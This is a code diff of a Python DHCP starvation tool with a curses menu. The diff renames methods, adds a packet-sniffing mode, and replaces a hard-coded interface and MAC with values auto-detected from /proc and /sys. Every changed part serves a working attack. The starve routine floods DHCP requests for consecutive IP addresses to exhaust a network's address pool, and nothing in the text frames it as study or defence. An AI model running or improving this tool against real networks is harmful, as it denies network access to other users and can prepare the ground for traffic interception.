@@ -6,15 +6,7 @@ from time import sleep
 import curses
 import os
 from ipaddress import IPv4Address
-
-
-# configuration
-LOCALIFACE = 'wlan0'
-REQUESTMAC = 'b8:27:eb:24:38:86'
-MYHOSTNAME='host'
-LOCALMAC = get_if_hwaddr(LOCALIFACE)
-LOCALMACRAW = bytes.fromhex(REQUESTMAC.replace(':',''))
-
+import socket, struct
 
 class DhcpStarve:
     def __init__(self):
@@ -38,10 +30,10 @@ class DhcpStarve:
                 print(pkt[DHCP].options[2][1].decode())    #error msg
             elif pkt[DHCP].options[0][1]==2:               #2 is DHCPOFFER
                 print("Offer received: \n{}".format(pkt[DHCP].options))
-        else:
-            print(pkt.display())
+            else:
+                print(pkt.display())
 
-    def _sniffWrapper(sendPacketMethod):
+    def _sniff_wrapper(sendPacketMethod):
         '''Launches sniffing process around another passed method'''
         def wrapper(self, *args, **kwargs):
             listenProcess = multiprocessing.Process(target=self.listen)
@@ -50,10 +42,10 @@ class DhcpStarve:
             sendPacketMethod(self, *args, **kwargs)
             sleep(0.5)
             listenProcess.terminate()
-            input('Press any key...')
+            input('Press any key to come back to menu.')
         return wrapper  
  
-    @_sniffWrapper
+    @_sniff_wrapper
     def discover(self):
         '''Use method to send dhcp discover.'''
         # craft DHCP DISCOVER
@@ -65,7 +57,7 @@ class DhcpStarve:
         # start listening and send packet
         sendp(dhcpDiscover,iface=LOCALIFACE)  
         
-    @_sniffWrapper
+    @_sniff_wrapper
     def starve(self,startIP,limit):
         '''Generate DHCP requests in loop'''
         for requestedIP in self.nextIP(startIP,limit):
@@ -80,6 +72,13 @@ class DhcpStarve:
             dhcpResp = sendp(dhcpRequest,iface=LOCALIFACE)
             print('Requesting for IP: {}'.format(requestedIP))
             sleep(0.5)
+        print('Succesfully starved IPs: {}'.format(self.starvedIPs))
+
+    @_sniff_wrapper
+    def sniffing(self):
+        '''Just snffing with _sniff_wrapper method '''
+        print('Starting sniffing for DHCP packets on interface: {} for 60 sec'.format(LOCALIFACE))
+        input('Press any key to stop')
     
     def nextIP(self,startIP,limit):
         '''Provides next ip addresses from some start IP, number of given addresses is limited'''
@@ -91,16 +90,6 @@ class DhcpStarve:
                 break
             yield IPv4Address(startIP) + i
     
-    def nextIP_old(self,startIP,limit):
-        '''returns generator which gives next ip addresses from some starting IP, limit is number of ips to give'''
-        for i in range(limit):
-            ipOctets = startIP.split('.')
-            ipBin = ''.join([str(format(int(octet),'08b')) for octet in ipOctets])
-            nextIPint = int(ipBin, base=2) + i
-            nextIPbin = str(format(nextIPint,'032b'))
-            nextOctets = [ nextIPbin[index:index+8] for index,bit in enumerate(nextIPbin) if not index%8 ]
-            nextOctetsInt = [str(int(octet,base=2)) for octet in nextOctets] 
-            yield ('.'.join(nextOctetsInt))
 
 class Menu:
     '''Menu made with curses'''
@@ -110,9 +99,9 @@ class Menu:
         self.menuItemsHint = "Choose an option or press q to quit:"
         self.menuItems = menuItems
         self.subtitle = "v0.1 written by Jarek J"
-        curses.wrapper(self.drawMenu)
+        curses.wrapper(self.draw_menu)
         
-    def drawMenu(self,stdscr):
+    def draw_menu(self,stdscr):
         '''Draws menu with curses'''
         key = 0
         self.menuHighlight=0
@@ -144,10 +133,12 @@ class Menu:
             if   key == curses.KEY_DOWN and self.menuHighlight < len(self.menuItems)-1:  self.menuHighlight += 1
             elif key == curses.KEY_UP and self.menuHighlight > 0:                        self.menuHighlight -= 1
             if   key == 10 and self.menuHighlight == 0:                     #10 is ENTER
-                self.chooseStarving() 
+                self.choose_starving() 
             if   key == 10 and self.menuHighlight == 1:                     
-                self.chooseDiscover()                                         
-             
+                self.choose_discover()                                         
+            if   key == 10 and self.menuHighlight == 2:                     
+                self.choose_sniffing()       
+                
             # Render status bar
             self.stdscr.attron(curses.color_pair(3))
             self.stdscr.attroff(curses.color_pair(3))
@@ -175,7 +166,7 @@ class Menu:
         curses.endwin()
         os._exit(0)
       
-    def stringInput(self,stdscr, x, y, prompt):
+    def string_input(self,stdscr, x, y, prompt):
         '''Displays prompt and returns user input (on x/y coordinates)'''
         curses.echo() 
         self.stdscr.addstr(y, x, prompt)
@@ -185,23 +176,62 @@ class Menu:
         self.stdscr.clrtoeol()
         return input  
     
-    def chooseStarving(self):
+    def choose_starving(self):
         '''Initiate dhcp Starve menu option'''
-        startIP = self.stringInput(self.stdscr, self.start_x_title+15, self.start_y+self.menuHighlight+4, 'Enter start IP: ')
-        limit = self.stringInput(self.stdscr, self.start_x_title+15, self.start_y+self.menuHighlight+4, 'Enter limit of IPs: ')
+        startIP = self.string_input(self.stdscr, self.start_x_title+15, self.start_y+self.menuHighlight+4, 'Enter start IP: ')
+        limit = self.string_input(self.stdscr, self.start_x_title+15, self.start_y+self.menuHighlight+4, 'Enter limit of IPs: ')
         curses.endwin()
         dhcp = DhcpStarve()
         return dhcp.starve(startIP.decode(),int(limit))
         
-    def chooseDiscover(self):
+    def choose_discover(self):
         '''Initiate dhcp discover menu option'''
         curses.endwin()
         dhcp = DhcpStarve()
         return dhcp.discover()
         
+    def choose_sniffing(self):
+        '''Initiate dhcp sniff menu option'''
+        curses.endwin()
+        dhcp = DhcpStarve()
+        return dhcp.sniffing()
+
+
+def get_network_def():
+    """Read the default gateway directly from /proc."""
+    output={}
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                continue
+
+            output.update({'defGW': socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))})
+
+    with open("/proc/net/arp") as fh:
+        for line in fh:
+            if output.get('defGW') in line:
+                output.update({'dev': line.split()[5].strip()})
+                output.update({'GWmac': line.split()[3]})
+    
+    with open("/sys/class/net/{}/address".format(output.get('dev'))) as fh:
+        for line in fh:
+            output.update({'mac': line.strip()})
+        return output
+
+print(get_network_def())
+
+
+# configuration
+LOCALIFACE = get_network_def().get('dev')
+REQUESTMAC = get_network_def().get('mac')
+MYHOSTNAME='host'
+LOCALMAC = get_if_hwaddr(LOCALIFACE)
+LOCALMACRAW = bytes.fromhex(REQUESTMAC.replace(':',''))
+
 def main():
     while 1:
-        menuObj = Menu(['DHCP Starve', 'DHCP Discover', 'Unused option 3'])
+        menuObj = Menu(['DHCP Starve', 'DHCP Discover', 'Sniff for DHCP Packets'])
         
 if __name__ == '__main__':
 	main()
